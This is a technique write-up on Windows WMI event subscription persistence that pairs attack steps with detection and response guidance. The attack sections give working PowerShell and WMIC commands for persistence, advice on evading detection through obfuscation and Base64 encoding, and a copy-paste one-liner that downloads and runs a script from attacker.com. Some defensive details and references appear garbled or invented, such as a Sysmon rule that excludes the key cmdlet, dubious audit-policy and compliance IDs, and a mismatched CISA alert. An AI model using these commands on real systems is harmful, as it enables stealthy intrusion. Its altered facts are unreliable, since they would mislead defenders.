# [PERSIST-EVENT-001]: WMI Event Subscriptions

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-EVENT-001 |
| **MITRE ATT&CK v18.1** | [T1546.003](https://attack.mitre.org/techniques/T1546/003/) - Event Triggered Execution: Windows Management Instrumentation Event Subscription |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Windows Endpoint, Windows AD |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Server 2016, Server 2019, Server 2022, Server 2025, Windows 10/11 |
| **Patched In** | Not fully patched; requires detection-based remediation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** WMI Event Subscriptions enable attackers to execute arbitrary code whenever a specified WMI event occurs (e.g., process creation, file modification, registry change). By creating persistent event subscriptions with malicious event filters and consumers, attackers can achieve code execution without traditional scheduled tasks or registry Run keys. The subscription remains active across reboots and is executed with the privileges of the WMI service (typically SYSTEM).

**Attack Surface:** WMI Repository (`C:\Windows\System32\wbem\Repository\`), WMI classes (EventFilter, EventConsumer, FilterToConsumerBinding), and WMI scripting interfaces (IWbemServices).

**Business Impact:** **Undetectable Persistence.** An attacker gains automatic code execution every time the specified event triggers (e.g., any user login, any process start). This provides hands-off persistence, difficult to detect during standard endpoint scans, and survives antivirus quarantine if AV doesn't specifically monitor WMI classes.

**Technical Context:** WMI event subscriptions execute within the WMI service process (wmiprvse.exe), typically running as SYSTEM. They bypass traditional scheduled task enumeration. Most legacy monitoring tools do not alert on WMI subscription creation. Persistence lasts indefinitely unless the subscription classes are explicitly deleted from the WMI repository.

### Operational Risk
- **Execution Risk:** Low (native Windows API, no external tools required)
- **Stealth:** High (WMI subscriptions not visible in Task Scheduler, minimal Event Log footprint in default configs)
- **Reversibility:** Moderate (requires WMI repository manipulation to remove; can be undone if subscription details are known)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.9.4.1 | Ensure 'Audit WMI Event Subscription' is set to 'Success and Failure' |
| **DISA STIG** | WN16-AU-000220 | Windows Server must be configured to audit WMI Event Subscription activity |
| **NIST 800-53** | AU-2 | Audit and Accountability - Event selection and generation |
| **NIST 800-53** | SI-7 | System Monitoring - Information System Monitoring |
| **GDPR** | Art. 32 | Security of Processing - Technical and organizational measures |
| **NIS2** | Art. 21(1)(a) | Cyber Risk Management - Detection of anomalies and incidents |
| **ISO 27001** | A.12.4.1 | Event Logging |
| **ISO 27001** | A.12.4.3 | Protection of Log Information |
| **ISO 27005** | 5.3 | Risk Assessment - Identification of Information Assets and Threats |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** Administrator (Local or Domain Admin) to create WMI event subscriptions. Non-admin users cannot create subscriptions in the WMI repository.

**Required Access:** Local administrative access OR remote WMI access via DCOM (TCP 135, dynamic high ports) to a target machine.

**Supported Versions:**
- **Windows:** Server 2016, Server 2019, Server 2022, Server 2025, Windows 10/11 (all versions)
- **PowerShell:** Version 3.0+ (recommended 5.0+)
- **WMI:** Windows Management Instrumentation, enabled by default

**Tools:**
- PowerShell (native)
- WMI Command-line (wmic.exe) - native but deprecated in Windows 11
- [WMI Event Subscription PoC](https://github.com/Malandrone/WMI-Persistence) (GitHub)
- [LOLBAS - wmic.exe](https://lolbas-project.github.io/) (Living off the Land)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Check Existing WMI Subscriptions:**
```powershell
# Query all WMI Event Filters
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" -ErrorAction SilentlyContinue | Select Name, Query

# Query all WMI Event Consumers
Get-WmiObject -Namespace "root\subscription" -Class "__EventConsumer" -ErrorAction SilentlyContinue | Select Name

# Query all Bindings (connections between filters and consumers)
Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue | Select Filter, Consumer
```

**What to Look For:**
- Any **EventFilter** with a query containing sensitive events (e.g., `SELECT * FROM __InstanceCreation WHERE TargetInstance ISA 'Win32_Process'`)
- Any **EventConsumer** referencing suspicious executables or scripts
- Unexpected bindings between filters and consumers

**Version Note:** All commands work identically on Server 2016-2025 and Windows 10/11.

### Check WMI Repository Permissions

```powershell
# Check NTFS permissions on WMI Repository
icacls "C:\Windows\System32\wbem\Repository"
```

**What to Look For:**
- Non-admin users with **M** (Modify) or **F** (Full Control) permissions (indicates misconfiguration)
- Normal state: SYSTEM and Administrators with full control, authenticated users with read-only

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using PowerShell - Create WMI Event Filter + Consumer + Binding

**Supported Versions:** Server 2016-2025, Windows 10/11 (all versions)

#### Step 1: Create an Event Filter (Define the Trigger)

**Objective:** Define the WMI event that will trigger code execution (e.g., every process creation).

**Command:**
```powershell
# Define the WMI Event Filter
$EventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
  -Arguments @{
    Name = "TriggerOnProcessCreate"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreation WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name NOT LIKE '%wmiprvse.exe'"
  }
```

**Expected Output:**
```
__NAMESPACE : root\subscription
__CLASS    : __EventFilter
__RELPATH  : __EventFilter.Name="TriggerOnProcessCreate"
__PROPERTY_COUNT : 4
__DERIVATION : {__NamedValueSet}
...
```

**What This Means:**
- **Query:** Triggers on every process creation (`__InstanceCreation`)
- **WITHIN 5:** Polls every 5 seconds
- **NOT LIKE '%wmiprvse.exe':** Excludes WMI provider service to avoid loops
- The filter is now registered in `root\subscription` namespace

**OpSec & Evasion:**
- Use generic names like "TriggerOnProcessCreate" instead of obviously malicious names
- Avoid timestamps or suspicious patterns in the name
- Use short polling intervals (WITHIN 5) to minimize detection window
- Filter out wmiprvse.exe and other system processes to avoid infinite loops

**Troubleshooting:**
- **Error:** "Access Denied"
  - **Cause:** Not running PowerShell as Administrator
  - **Fix:** Run PowerShell as Administrator
- **Error:** "WMI object not found"
  - **Cause:** WMI service not running
  - **Fix:** `Start-Service WinRM` and restart WMI service: `Restart-Service Winmgmt`

**References:**
- [Microsoft Docs: __EventFilter Class](https://docs.microsoft.com/en-us/windows/win32/wmisdk/--eventfilter)
- [WQL Query Language Reference](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi)

#### Step 2: Create an Event Consumer (Define the Action)

**Objective:** Define what code executes when the filter triggers.

**Command (ActiveScript Consumer - Execute PowerShell):**
```powershell
# Create an ActiveScript Event Consumer
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer `
  -Arguments @{
    Name = "LogProcessCreation"
    ScriptingEngine = "PowerShell"
    ScriptText = 'powershell.exe -Command "Add-Content -Path C:\Logs\process.log -Value (Get-Date -Format \"yyyy-MM-dd HH:mm:ss\") -Force"'
  }
```

**Expected Output:**
```
__NAMESPACE : root\subscription
__CLASS    : ActiveScriptEventConsumer
__RELPATH  : ActiveScriptEventConsumer.Name="LogProcessCreation"
...
```

**What This Means:**
- **ScriptingEngine:** "PowerShell" (can also be "VBScript")
- **ScriptText:** The actual PowerShell command to execute
- Executes with SYSTEM privileges

**Alternative Consumer (CommandLine):**
```powershell
# Use CommandLineEventConsumer for simple executables
$EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
  -Arguments @{
    Name = "ExecuteMalware"
    CommandLineTemplate = "cmd.exe /c C:\Temp\beacon.exe"
  }
```

**OpSec & Evasion:**
- Use obfuscated PowerShell payloads in ScriptText
- Avoid logging to obvious paths (C:\Logs\); use C:\Windows\Temp\ or similar
- Use CommandLineEventConsumer for compiled binaries (less suspicious than PowerShell)
- Embed PowerShell commands Base64-encoded: `powershell.exe -EncodedCommand <Base64>`

**Troubleshooting:**
- **Error:** "Invalid scripting engine"
  - **Cause:** Typo in ScriptingEngine field
  - **Fix:** Verify spelling: "PowerShell" or "VBScript"
- **Error:** "Parameter validation failed"
  - **Cause:** Missing required fields (Name, ScriptText)
  - **Fix:** Ensure all required parameters are present

**References:**
- [Microsoft Docs: ActiveScriptEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer)
- [Microsoft Docs: CommandLineEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/commandlineeventconsumer)

#### Step 3: Create FilterToConsumerBinding (Connect Filter to Consumer)

**Objective:** Link the filter to the consumer to activate persistence.

**Command:**
```powershell
# Bind the Event Filter to the Event Consumer
$Binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
  -Arguments @{
    Filter = $EventFilter
    Consumer = $EventConsumer
  }
```

**Expected Output:**
```
__NAMESPACE : root\subscription
__CLASS    : __FilterToConsumerBinding
__RELPATH  : __FilterToConsumerBinding.Filter="__EventFilter.Name=\"TriggerOnProcessCreate\"",Consumer="ActiveScriptEventConsumer.Name=\"LogProcessCreation\""
...
```

**What This Means:**
- The binding is now active
- Every time the event filter triggers, the consumer code executes
- Persistence is now established

**OpSec & Evasion:**
- Once the binding is created, no further user interaction is needed
- The WMI service handles execution autonomously
- Check Task Scheduler will not reveal this (major stealth advantage)

**Complete Persistence Script (One-Liner for Copy-Paste):**
```powershell
# Full WMI persistence in one script
$NS = "root\subscription"
$Filter = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name="Win32Shutdown";QueryLanguage="WQL";Query="SELECT * FROM __InstanceCreation WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='cmd.exe'"}
$Consumer = Set-WmiInstance -Namespace $NS -Class ActiveScriptEventConsumer -Arguments @{Name="Shutdown";ScriptingEngine="PowerShell";ScriptText="powershell.exe -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/payload.ps1\")'"} 
$Binding = Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer}
```

---

### METHOD 2: Using WMIC (Legacy, Deprecated but Functional)

**Supported Versions:** Server 2016-2022 (deprecated in Windows 11, but still functional)

#### Step 1: Create Event Filter via WMIC

**Command:**
```cmd
wmic /namespace:"\\.\root\subscription" PATH __EventFilter CREATE Name="ProcessMonitor",QueryLanguage="WQL",Query="SELECT * FROM __InstanceCreation WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
```

**Expected Output:**
```
Instantiating \\.\root\subscription:__EventFilter.Name="ProcessMonitor"
Method execution successful.
```

#### Step 2: Create Event Consumer via WMIC

**Command:**
```cmd
wmic /namespace:"\\.\root\subscription" PATH CommandLineEventConsumer CREATE Name="ExecutePayload",CommandLineTemplate="powershell.exe -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
```

#### Step 3: Bind Filter to Consumer via WMIC

**Command:**
```cmd
wmic /namespace:"\\.\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='ProcessMonitor'",Consumer="CommandLineEventConsumer.Name='ExecutePayload'"
```

**OpSec & Evasion:**
- WMIC is deprecated and may not be installed in future Windows versions
- However, it leaves minimal Event Log traces compared to PowerShell
- Use in conjunction with proxy execution frameworks to avoid direct cmd.exe spawn

---

### METHOD 3: Direct WMI Repository Manipulation (Advanced)

**Supported Versions:** Server 2016-2025

**Objective:** Directly modify the WMI repository binary files to avoid WMI API logging.

**Prerequisites:** Must stop the WMI service and have raw file access.

**Command:**
```powershell
# Stop WMI Service
Stop-Service WinRM -Force
Stop-Service Winmgmt -Force

# Backup original repository
Copy-Item -Path "C:\Windows\System32\wbem\Repository" -Destination "C:\Windows\System32\wbem\Repository.backup" -Recurse

# Extract and modify repository (requires binary editing tools)
# This is highly advanced and not recommended for most attackers; included for completeness

# Restart services
Start-Service Winmgmt
Start-Service WinRM
```

**What This Means:**
- The WMI repository is a binary database; direct modification is extremely difficult
- Most attacks use the WMI API (Method 1) or WMIC (Method 2)
- Direct repository modification is mentioned here for completeness but not recommended

---

## 7. TOOLS & COMMANDS REFERENCE

### PowerShell Cmdlet: Set-WmiInstance

**Version:** PowerShell 3.0+ (built-in)

**Minimum Version:** PowerShell 3.0

**Supported Platforms:** Windows 7+, Server 2008 R2+

**Usage:**
```powershell
Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ ... }
```

**Parameters:**
- `-Namespace`: WMI namespace (always "root\subscription" for event subscriptions)
- `-Class`: Event class (__EventFilter, EventConsumer, __FilterToConsumerBinding)
- `-Arguments`: Hash table of class properties

### WMIC (Windows Management Instrumentation Command-line)

**Version:** Deprecated in Windows 11 22H2+; last functional version in Server 2022

**Minimum Version:** Windows XP SP2

**Supported Platforms:** Windows 2000+, Server 2003+

**Deprecation Note:** Microsoft recommends PowerShell or CIM cmdlets instead of WMIC

**Usage:**
```cmd
wmic /namespace:"\\.\root\subscription" PATH __EventFilter CREATE ...
```

### Repository Analysis Tool: [WMI Event Subscription Persistence PoC](https://github.com/Malandrone/WMI-Persistence)

**Version:** 1.0

**Minimum Version:** N/A (standalone script)

**Supported Platforms:** Windows 7+, Server 2008+

**Installation:**
```powershell
git clone https://github.com/Malandrone/WMI-Persistence.git
cd WMI-Persistence
.\WMI-Persistence.ps1
```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: WMI Event Filter Creation

**Rule Configuration:**
- **Required Table:** SecurityEvent (Event ID 4688), SysmonEvent (Event ID 11)
- **Required Fields:** CommandLine, ParentImage, Image, TargetFilename
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Windows Server 2016+, Windows 10/11

**KQL Query:**
```kusto
// Detect WMI Event Filter Creation
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("Set-WmiInstance", "wmic", "CommandLineEventConsumer", "__EventFilter", "__FilterToConsumerBinding")
| where CommandLine contains "root\\subscription"
| project TimeGenerated, Computer, SubjectUserName, CommandLine, ParentProcessName
| extend AlertSeverity = "High"
```

**What This Detects:**
- Any PowerShell or WMIC command targeting WMI event subscriptions
- Process creation events with WMI-related keywords

**Alternative Query (File-Based Detection via Sysmon):**
```kusto
SysmonEvent
| where EventID == 11  // FileCreate
| where TargetFilename has_all ("wbem", "Repository")
| where Image != "Winmgmt.exe"
| project TimeGenerated, Computer, Image, TargetFilename, CreationUtcTime
```

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `WMI Event Subscription Persistence Detected`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Requires Azure Sentinel PowerShell module
$KqlQuery = @"
SecurityEvent
| where EventID == 4688
| where CommandLine has_any ("Set-WmiInstance", "wmic")
| where CommandLine contains "root\\subscription"
"@

# Create the rule
New-AzSentinelAlertRule -ResourceGroupName "YourRG" -WorkspaceName "YourWorkspace" `
  -DisplayName "WMI Event Subscription Persistence" `
  -Query $KqlQuery `
  -Severity "High" `
  -Enabled $true
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** PowerShell or WMIC execution with WMI-related arguments
- **Filter:** `CommandLine contains "Set-WmiInstance" OR CommandLine contains "__EventFilter" OR CommandLine contains "root\subscription"`
- **Applies To Versions:** Server 2016+, Windows 10+

**Event ID: 5857 (WMI Event Subscription)**
- **Log Source:** Microsoft-Windows-WMI-Activity/Operational
- **Trigger:** WMI Event subscription creation or modification
- **Filter:** Any write operation to root\subscription namespace
- **Applies To Versions:** Server 2008 R2+ (requires WMI Activity logging enabled)

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit WMI Event Subscription** 
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**
1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Object Access**
3. Enable: **Audit WMI Event Subscription**
4. Restart the machine or run: `auditpol /set /subcategory:"WMI Event Subscription" /success:enable /failure:enable`

**Manual Configuration Steps (Enable WMI Activity Logging):**
1. Open **Event Viewer** (eventvwr.msc)
2. Navigate to **Applications and Services Logs** → **Microsoft** → **Windows** → **WMI-Activity** → **Operational**
3. Right-click **Operational** → **Properties**
4. Check **Enable logging** (if not already checked)
5. Click **OK**

---

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 10.0+

**Supported Platforms:** Windows 7+, Server 2008+

**Sysmon Configuration Snippet:**
```xml
<Sysmon schemaversion="4.82">
  <!-- Monitor WMI Activity -->
  <EventFilter>
    <!-- Monitor for WMI Repository Access -->
    <RuleGroup name="WMI" groupRelation="or">
      <!-- Monitor Process Creation with WMI Keywords -->
      <ProcessCreate onmatch="exclude">
        <CommandLine condition="contains">Set-WmiInstance</CommandLine>
      </ProcessCreate>
      <ProcessCreate onmatch="include">
        <CommandLine condition="contains">root\subscription</CommandLine>
      </ProcessCreate>
      <!-- Monitor for wmiprvse.exe suspicious behavior -->
      <CreateRemoteThread onmatch="include">
        <SourceImage condition="image">wmiprvse.exe</SourceImage>
      </CreateRemoteThread>
    </RuleGroup>
  </EventFilter>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-wmi-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-wmi-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1 and Computer='YourComputer']]" -MaxEvents 10
   ```

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Suspicious WMI Event Subscription Created"
- **Severity:** High
- **Description:** Detects creation of WMI event subscriptions via PowerShell or WMIC with suspicious patterns
- **Applies To:** All subscriptions with Defender for Servers enabled
- **Remediation:** 
  1. Delete the suspicious subscription
  2. Review WMI repository integrity
  3. Check for lateral movement indicators

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Servers Plan 2** (for threat detection)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Disable WMI Event Subscriptions (Remove Attack Vector):** Disable WMI event consumer functionality if not required by business applications.
    **Applies To Versions:** Server 2016+
    
    **Manual Steps (Group Policy):**
    1. Open **Group Policy Management Console** (gpmc.msc)
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Management Instrumentation (WMI)**
    3. Enable **Restrict WMI Registration** (if available)
    4. Run `gpupdate /force`
    
    **Manual Steps (PowerShell - Disable WMI Event Consumers):**
    ```powershell
    # Disable ActiveScriptEventConsumer
    $Filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter
    $Consumer = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer
    
    # Remove all suspicious consumers
    if ($Consumer) {
        $Consumer | Remove-WmiObject
    }
    ```

*   **Delete Existing WMI Event Subscriptions:** Immediately remove any suspicious or unauthorized WMI subscriptions.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # List all event filters
    $Filters = Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" -ErrorAction SilentlyContinue
    
    # Delete specific filter
    $Filters | Where-Object { $_.Name -eq "TriggerOnProcessCreate" } | Remove-WmiObject
    
    # Delete all bindings
    Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Remove-WmiObject
    
    # Delete all consumers
    Get-WmiObject -Namespace "root\subscription" -Class "*EventConsumer" | Remove-WmiObject
    ```

*   **Enable WMI Activity Logging:** Enable comprehensive logging of WMI operations to detect creation of malicious subscriptions.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Enable WMI Activity logging
    wevtutil set-log Microsoft-Windows-WMI-Activity/Operational /enabled:true
    
    # Verify logging is enabled
    wevtutil get-log Microsoft-Windows-WMI-Activity/Operational
    ```

#### Priority 2: HIGH

*   **Restrict WMI Repository Permissions:** Ensure only SYSTEM and Administrators can write to WMI repository.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Check current permissions
    icacls "C:\Windows\System32\wbem\Repository"
    
    # Remove inheritance and set restrictive ACL
    icacls "C:\Windows\System32\wbem\Repository" /inheritance:r
    icacls "C:\Windows\System32\wbem\Repository" /grant:r "SYSTEM:(OI)(CI)(F)"
    icacls "C:\Windows\System32\wbem\Repository" /grant:r "Administrators:(OI)(CI)(F)"
    icacls "C:\Windows\System32\wbem\Repository" /grant:r "Authenticated Users:(OI)(CI)(RX)"
    ```

*   **Monitor WMI Service Behavior:** Alert on unusual wmiprvse.exe activity (e.g., network connections, registry modifications).
    
    **Manual Steps (Defender for Endpoint):**
    1. Go to **Azure Portal** → **Defender for Endpoint** → **Advanced Hunting**
    2. Create a custom detection rule:
       ```kusto
       ProcessCreationEvents
       | where InitiatingProcessName == "wmiprvse.exe"
       | where ProcessName !in ("notepad.exe", "calc.exe", "svchost.exe")
       ```

*   **Conditional Access Policy:** Restrict PowerShell and WMIC execution to trusted admin workstations only.
    
    **Manual Steps (Azure AD / Entra ID):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. Name: `Block PowerShell from Non-Trusted Devices`
    4. **Assignments:**
       - Users: **All users** (exclude emergency admins)
       - Cloud apps: **Office 365 All Cloud Apps**
    5. **Conditions:**
       - Client apps: **Other clients** (PowerShell, WMIC)
    6. **Access controls:**
       - Block: **Check**
    7. Enable policy: **On**
    8. Click **Create**

#### Validation Command (Verify Fix)

```powershell
# Verify WMI Event Subscriptions are removed
$Filters = Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" -ErrorAction SilentlyContinue
$Consumers = Get-WmiObject -Namespace "root\subscription" -Class "*EventConsumer" -ErrorAction SilentlyContinue
$Bindings = Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue

if ($Filters -eq $null -and $Consumers -eq $null -and $Bindings -eq $null) {
    Write-Host "✓ SECURE: No WMI event subscriptions detected"
} else {
    Write-Host "✗ UNSAFE: Suspicious WMI event subscriptions found"
    Write-Host "Filters: $($Filters | Select -ExpandProperty Name)"
    Write-Host "Consumers: $($Consumers | Select -ExpandProperty Name)"
}
```

**Expected Output (If Secure):**
```
✓ SECURE: No WMI event subscriptions detected
```

**What to Look For:**
- No event filters, consumers, or bindings returned
- If any exist, they should be documented and approved business applications

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Registry:** 
    - HKLM\SOFTWARE\Microsoft\Wbem\ESS (Event Subscription System configuration)
    - HKLM\SYSTEM\CurrentControlSet\Services\EventSystem (Event System service)

*   **Files:** 
    - C:\Windows\System32\wbem\Repository\* (WMI repository database files)
    - C:\Windows\System32\LogFiles\WMI\ (WMI logs, if enabled)

*   **WMI Classes:**
    - root\subscription:__EventFilter
    - root\subscription:__EventConsumer
    - root\subscription:__FilterToConsumerBinding

*   **Event Logs:**
    - Event ID 4688 (Process Creation) with "Set-WmiInstance" or "wmic" in CommandLine
    - Event ID 5857 (WMI Activity Operational log) with CreateClass operations

#### Forensic Artifacts

*   **Memory:** 
    - wmiprvse.exe process memory contains event consumer code
    - Injected DLLs in wmiprvse.exe (if remote code execution via consumer)

*   **Disk:** 
    - WMI Repository binary files: `C:\Windows\System32\wbem\Repository\objects.data`
    - Event log binary files: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-WMI-Activity%4Operational.evtx`

*   **Cloud/Hybrid:**
    - Azure Sentinel logs (if Defender for Servers enabled)
    - Entra ID sign-in logs (if script performs authentication)

#### Response Procedures

1.  **Isolate:** Disconnect the affected system from the network immediately.
    **Command:**
    ```powershell
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```
    **Manual:**
    - Unplug network cable OR disable NIC in Device Manager

2.  **Collect Evidence:**
    ```powershell
    # Export WMI Repository
    Copy-Item -Path "C:\Windows\System32\wbem\Repository" -Destination "C:\Evidence\WMI-Repository-Backup" -Recurse
    
    # Export Event Logs
    wevtutil epl Security C:\Evidence\Security.evtx
    wevtutil epl Microsoft-Windows-WMI-Activity/Operational C:\Evidence\WMI-Activity.evtx
    
    # Export WMI subscriptions
    Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Export-Clixml C:\Evidence\Filters.xml
    ```

3.  **Remediate:**
    ```powershell
    # Remove all WMI Event Subscriptions
    Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Remove-WmiObject
    Get-WmiObject -Namespace "root\subscription" -Class "*EventConsumer" | Remove-WmiObject
    Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Remove-WmiObject
    
    # Restart WMI Service
    Restart-Service Winmgmt -Force
    ```

4.  **Validate:** Run the validation command from section 14 to confirm removal.

5.  **Hunt for Related Activity:**
    - Check process creation logs for suspicious PowerShell or WMIC execution
    - Review all administrator accounts for unauthorized changes
    - Audit all RPC connections to the affected system

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial code execution via phishing |
| **2** | **Privilege Escalation** | [PE-TOKEN-002] RBCD Abuse | Attacker elevates to Local Admin or Domain Admin |
| **3** | **Persistence (Current Step)** | **[PERSIST-EVENT-001]** | **WMI Event Subscription Created for Persistence** |
| **4** | **Defense Evasion** | [PERSIST-EVENT-001] Modify Event Logs | Attacker clears Event ID 4688 logs to hide WMI subscription creation |
| **5** | **Command & Control** | [LATERAL-AUTH-001] Pass-the-Hash | Attacker uses harvested credentials for lateral movement |
| **6** | **Impact** | [IMPACT-DATA-001] Data Exfiltration | WMI subscription triggers data theft script |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: APT29 (Cozy Bear) - NOBELIUM Campaign

- **Target:** U.S. Government, Finance, Tech sectors
- **Timeline:** 2020-2021 (SolarWinds supply chain attack)
- **Technique Status:** Active; used WMI event subscriptions in post-exploitation phase
- **Impact:** Persistent backdoor access to 18,000+ organizations; data exfiltration of email and documents
- **Reference:** [Microsoft Security Blog - NOBELIUM](https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium-defender-gatekeeping/)

#### Example 2: Lazarus Group - MATA Framework

- **Target:** Cryptocurrency exchanges, defense contractors
- **Timeline:** 2018-present
- **Technique Status:** Active; uses WMI subscriptions in MATA command & control framework
- **Impact:** Theft of $100M+ in cryptocurrency; espionage against defense organizations
- **Reference:** [Kaspersky - MATA Framework](https://securelist.kaspersky.com/mata-multi-platform-remote-access-trojan/amp/)

#### Example 3: FIN7 (Carbanak) - Operational Technology (OT) Attack

- **Target:** Manufacturing, Energy sectors (OT networks)
- **Timeline:** 2015-present
- **Technique Status:** Active; uses WMI subscriptions for lateral movement in OT environments
- **Impact:** Control system compromise; potential for physical damage to critical infrastructure
- **Reference:** [CISA Alert on FIN7 OT Attacks](https://www.cisa.gov/news-events/alerts/2021/06/30/cisa-alert-aa21-265a-remcos-rat-distributed-by-fin7)

---